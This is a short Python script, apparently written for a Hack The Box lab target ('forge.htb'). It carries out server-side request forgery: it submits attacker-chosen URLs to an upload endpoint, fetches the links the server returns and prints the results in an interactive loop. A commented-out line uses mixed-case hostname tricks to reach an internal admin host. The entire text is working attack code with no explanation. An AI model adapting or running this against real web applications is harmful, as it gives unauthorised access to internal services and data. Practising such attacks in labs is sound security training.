import readline
import requests as rq

URL = 'http://forge.htb/upload'

def ssrf(path):
	# res = rq.post(URL, data={'url': f'http://admin.ForGe.HTB/{path}', 'remote': 1}).text
	res = rq.post(URL, data={'url': path, 'remote': 1}).text
	# print(res)
	start = res.find('<strong><a href="') + len('<strong><a href="')
	end = start + res[start:].find('">')
	ssrf_url = res[start:end]

	ssrf_res = rq.get(ssrf_url).text
	print(ssrf_res)	

while True:
	path = input('[path]> ')	
	ssrf(path)
